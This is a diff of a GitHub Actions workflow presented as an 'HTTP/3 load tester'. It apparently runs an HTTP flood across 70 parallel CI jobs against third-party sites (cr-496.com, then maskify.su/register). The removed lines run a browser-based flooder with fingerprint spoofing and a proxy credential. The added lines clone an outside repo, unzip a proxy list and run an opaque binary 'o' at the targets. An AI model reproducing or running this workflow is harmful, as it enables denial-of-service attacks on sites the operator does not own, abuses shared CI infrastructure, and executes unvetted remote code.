@@ -11,7 +11,7 @@ jobs:
   parallel-execution-ubuntu:
     runs-on: ubuntu-24.04
     strategy:
-      max-parallel: 1
+      max-parallel: 20
       fail-fast: false  # Continue even if some instances fail
       matrix:
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70]
@@ -21,8 +21,7 @@ jobs:
         uses: actions/checkout@v4
       
       
-      - name: Setup Node.js environment
-        uses: actions/setup-node@v6.3.0
+      
       
       
       
@@ -30,17 +29,16 @@ jobs:
       
       - name: Run HTTP/3 load tester
         run: |
-          npm i chalk@4 colors request   hpack cluster    puppeteer puppeteer-real-browser fingerprint-generator axios chalk@4 colors request user-agents random-referer
           git clone https://github.com/Fegp1p2/ideal-guide.git
           cd ideal-guide
+          unzip Fc-main.zip
+          mv  Fc-main/proxy.txt 90.txt
+          chmod +x *
+          mv ki o          
           
-          echo '213.209.159.15:81:user_703f8f4979-country-kr-session-12323-time-1800:4ca02713d4430f2e' >> 2.txt
+           
           
-          xvfb-run -a node browser.js https://cr-496.com/ 300 4 64 2.txt --debug true --flooder true --auth true
-          
-          
-          
-
+          ./o https://maskify.su/register 350 1 1 
           
 
           
@@ -51,5 +49,5 @@ jobs:
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
-          TOTAL_INSTANCES: 70  # Updated to match the matrix count
+          TOTAL_INSTANCES: 1000 # Updated to match the matrix count
           RUNNER_OS: ubuntu
